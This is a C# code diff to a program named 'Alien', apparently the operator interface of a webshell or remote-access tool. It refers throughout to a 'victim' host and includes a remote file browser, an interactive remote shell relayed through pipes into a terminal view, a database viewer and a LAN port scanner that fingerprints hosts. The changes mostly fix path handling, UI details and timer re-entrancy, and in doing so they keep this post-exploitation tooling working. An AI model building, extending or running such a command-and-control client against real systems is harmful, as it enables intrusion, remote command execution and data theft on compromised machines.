@@ -36,6 +36,8 @@ namespace Alien
         public clsWeb m_web { get; init; }
         public clsVictim m_victim { get { return m_web.m_victim; } }
 
+        private bool m_isReading = false; // Virtual Shell
+
         public clsfnInfoSpyder m_infoSpyder { get; init; }
         public clsfnFileMgr m_fileMgr { get; init; }
         public clsfnShell m_rShell { get; set; }
@@ -1022,7 +1024,23 @@ namespace Alien
 
         #region Tool
 
-        private TreeNode fnFindNodeWithFullPath(TreeNodeCollection cNode, string szFullPath) => fnFindNodeWithFullPath(cNode, szFullPath.Replace("\\", "/").Split('/'));
+        private string[] GetPathParts(string path)
+        {
+            bool isRooted = m_victim.m_bUnixLike && path.StartsWith("/");
+
+            var parts = path
+                .Replace("\\", "/")
+                .Split('/', StringSplitOptions.RemoveEmptyEntries);
+
+            if (isRooted)
+                parts = (new[] { "/" }).Concat(parts).ToArray();
+
+            return parts;
+        }
+        private TreeNode fnFindNodeWithFullPath(TreeNodeCollection cNode, string szFullPath)
+        {
+            return fnFindNodeWithFullPath(cNode, GetPathParts(szFullPath));
+        }
         private TreeNode fnFindNodeWithFullPath(TreeNodeCollection cNode, string[] asName, TreeNode rootNode = null)
         {
             if (asName.Length == 0)
@@ -1101,23 +1119,37 @@ namespace Alien
             return lNode.ToArray();
         }
 
-        void fnFileAddPathToTreeView(string szDirPath) => fnFileAddPathToTreeView(szDirPath.Replace("\\", "/").Split('/'));
+        void fnFileAddPathToTreeView(string szDirPath)
+        {
+            bool isRooted = m_victim.m_bUnixLike && szDirPath.StartsWith("/");
+
+            string[] asDirPath = szDirPath
+                .Replace("\\", "/")
+                .Split('/', StringSplitOptions.RemoveEmptyEntries);
+
+            if (isRooted)
+            {
+                asDirPath = (new[] { "/" }).Concat(asDirPath).ToArray();
+            }
+
+            fnFileAddPathToTreeView(asDirPath);
+        }
         void fnFileAddPathToTreeView(string[] asDirPath, TreeNode node = null)
         {
             if (asDirPath.Length == 0)
                 return;
 
             string szDir = asDirPath[0];
-            TreeNode[] aNode = fnFileFindNodesWithText(node == null ? treeView3.Nodes : node.Nodes, szDir);
+
+            TreeNodeCollection nodes = node == null ? treeView3.Nodes : node.Nodes;
+
+            TreeNode[] aNode = fnFileFindNodesWithText(nodes, szDir);
+
             if (aNode.Length == 0)
             {
                 TreeNode newNode = new TreeNode(szDir);
-                if (node == null)
-                    treeView3.Nodes.Add(newNode);
-                else
-                    node.Nodes.Add(newNode);
-
-                aNode = new TreeNode[] { newNode };
+                nodes.Add(newNode);
+                aNode = new[] { newNode };
             }
 
             fnFileAddPathToTreeView(asDirPath[1..], aNode[0]);
@@ -1129,7 +1161,7 @@ namespace Alien
         {
             listView2.Items.Clear();
 
-            szDir = szDir.Replace("\r\n", string.Empty).Replace(Environment.NewLine, string.Empty).Trim('\n');
+            szDir = szDir.Replace("\r\n", string.Empty).Replace(Environment.NewLine, string.Empty).Trim('\n').Replace("\\", "/").Replace("//", "/");
             textBox1.Text = szDir;
 
             TreeNode node = fnFindNodeWithFullPath(treeView3.Nodes, szDir);
@@ -1137,8 +1169,20 @@ namespace Alien
                 node = fnFindNodeWithFullPath(treeView3.Nodes, szDir.Replace("\\", string.Empty));
 
             var le = await m_fileMgr.fnleScandir(szDir);
-            var leFolder = le.Where(x => x.bIsDirectory).ToList();
-            var leFile = le.Where(x => !x.bIsDirectory).ToList();
+            var leFolder = le.Where(x => !string.IsNullOrEmpty(x.szEntryName.Trim())).Where(x => x.bIsDirectory).ToList();
+            var leFile = le.Where(x => !string.IsNullOrEmpty(x.szEntryName.Trim())).Where(x => !x.bIsDirectory).ToList();
+
+            if (leFolder.Count == 0 && leFile.Count == 0)
+            {
+                if (node.Nodes.Count > 0)
+                {
+                    MessageBox.Show("Access denial: " + szDir, "Error", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                }
+
+                toolStripStatusLabel2.Text = $"Action successfully | Folder[{leFolder.Count}], File[{leFile.Count}]";
+
+                return;
+            }
 
             // TreeView
             if (node.Nodes.Count > 0)
@@ -1544,17 +1588,20 @@ namespace Alien
             var ret = await m_rShell.fnShellExecute(szCommand);
             string[] asOutput = ret.szOutput.Replace("\r\n", "\n").Split('\n');
 
+            richTextBox1.SelectionFont = richTextBox1.Font;
             richTextBox1.AppendText(string.Join(Environment.NewLine, asOutput));
             richTextBox1.AppendText(Environment.NewLine);
 
             ret.szCurrentDir = ret.szCurrentDir.Replace("\r\n", "\n").Replace("\n", string.Empty);
 
             string szPrompt = $"{(m_victim.m_bUnixLike ? $"{ret.szCurrentDir}$ " : $"{ret.szCurrentDir}> ")}";
+            richTextBox1.SelectionFont = richTextBox1.Font;
             richTextBox1.AppendText(szPrompt);
             richTextBox1.Focus();
 
             richTextBox1.SelectionStart = richTextBox1.Text.Length;
             richTextBox1.SelectionLength = 0;
+            richTextBox1.SelectionFont = richTextBox1.Font;
 
             richTextBox1.Tag = richTextBox1.Text.Length;
         }
@@ -1717,8 +1764,9 @@ namespace Alien
 
             if (data.Rows.Count == 0)
             {
-                MessageBox.Show($"Cannot fine any data in the table [{szTable}]");
-                ctrls.dataGridView.Rows.Add();
+                MessageBox.Show($"Cannot fine any data in the table [{szTable}]", "Empty", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                DataRow row = data.NewRow();
+                data.Rows.Add(row);
             }
         }
 
@@ -2363,7 +2411,7 @@ namespace Alien
             tabControl8.SizeMode = TabSizeMode.Fixed;
 
             string szBaseDir = AppDomain.CurrentDomain.BaseDirectory;
-            string szRelativePath = Path.Combine("Tools", "xterm", "terminal.html");
+            string szRelativePath = Path.Combine("Tools", "xterm", m_victim.m_bUnixLike ? "linux.html" : "windows.html");
             string szAbsolutePath = Path.Combine(szBaseDir, szRelativePath);
 
             await webViewShell.EnsureCoreWebView2Async(null);
@@ -3402,15 +3450,21 @@ namespace Alien
 
         private async void button1_Click(object sender, EventArgs e)
         {
-            bool bStop = string.Equals(button1.Text, "Start");
+            bool bStart = string.Equals(button2.Text, "Start");
 
-            if (!bStop)
+            if (!bStart)
             {
-                // Is running
                 timerShell.Stop();
-                button1.Text = "Start";
+                button2.Text = "Start";
                 m_rShell.m_bIsRunning = false;
 
+                try
+                {
+                    await m_rShell.fnPipeStop();
+                }
+                catch { }
+
+                m_isReading = false;
                 return;
             }
 
@@ -3444,17 +3498,26 @@ namespace Alien
 
         private async void button2_Click(object sender, EventArgs e)
         {
-            bool bStop = string.Equals(button2.Text, "Start");
+            bool bStart = string.Equals(button2.Text, "Start");
 
-            if (!bStop)
+            if (!bStart)
             {
-                // Is running
                 timerShell.Stop();
                 button2.Text = "Start";
                 m_rShell.m_bIsRunning = false;
 
+                try
+                {
+                    await m_rShell.fnPipeStop();
+                }
+                catch { }
+
+                m_isReading = false;
                 return;
             }
+
+            timerShell.Stop();
+            m_isReading = false;
 
             await m_rShell.fnPipeCreate(textBox5.Text);
             m_rShell.m_bIsRunning = true;
@@ -3466,12 +3529,17 @@ namespace Alien
 
         private async void timerShell_Tick(object sender, EventArgs e)
         {
-            string szResp = await m_rShell.fnPipeRead();
-            if (string.IsNullOrEmpty(szResp))
+            if (m_isReading || !m_rShell.m_bIsRunning)
                 return;
+
+            m_isReading = true;
 
             try
             {
+                string szResp = await m_rShell.fnPipeRead();
+                if (string.IsNullOrEmpty(szResp))
+                    return;
+
                 var objJson = JsonConvert.DeserializeObject<dynamic>(szResp);
                 if (objJson == null)
                     return;
@@ -3480,11 +3548,13 @@ namespace Alien
                 if (status != "success")
                     return;
 
+                string szb64Msg = objJson.msg;
+                if (string.IsNullOrEmpty(szb64Msg))
+                    return;
+
                 Encoding encoding = Encoding.GetEncoding(m_victim.ShellEncoding);
 
-                string szb64Msg = objJson.msg;
                 byte[] abBuffer = Convert.FromBase64String(szb64Msg);
-
                 string szText = Encoding.UTF8.GetString(abBuffer);
                 byte[] abBytes = encoding.GetBytes(szText);
 
@@ -3493,13 +3563,23 @@ namespace Alien
                     return;
 
                 if (m_victim.m_bUnixLike)
-                    webViewLinuxShell.CoreWebView2.PostWebMessageAsString(szb64Msg);
+                {
+                    if (webViewLinuxShell?.CoreWebView2 != null)
+                        webViewLinuxShell.CoreWebView2.PostWebMessageAsString(szb64Msg);
+                }
                 else
-                    webViewShell.CoreWebView2.PostWebMessageAsString(szb64Msg);
+                {
+                    if (webViewShell?.CoreWebView2 != null)
+                        webViewShell.CoreWebView2.PostWebMessageAsString(szb64Msg);
+                }
             }
             catch
             {
 
+            }
+            finally
+            {
+                m_isReading = false;
             }
         }
 
@@ -4317,17 +4397,22 @@ namespace Alien
                         else
                             m_lan.m_dicHost.Add(ip, new List<int> { port });
 
-                        if (!bExists)
+                        ListViewItem? item = null;
+                        Invoke(() => item = listView14.FindItemWithText(ip));
+
+                        if (item == null)
                         {
-                            ListViewItem item = new ListViewItem(ip);
-                            if (m_lan.m_dicHost[ip].Contains(139) || m_lan.m_dicHost[ip].Contains(445))
+                            item = new ListViewItem(ip);
+                            item.ImageKey = "Unknown";
+
+                            Invoke(() => listView14.Items.Add(item));
+                        }
+                        else
+                        {
+                            if (m_lan.m_dicHost[ip].Contains(135) || m_lan.m_dicHost[ip].Contains(139) || m_lan.m_dicHost[ip].Contains(445))
                                 item.ImageKey = "Windows";
                             else if (m_lan.m_dicHost[ip].Contains(22))
                                 item.ImageKey = "Linux";
-                            else
-                                item.ImageKey = "Unknown";
-
-                            Invoke(() => listView14.Items.Add(item));
                         }
 
                         Invoke(() =>
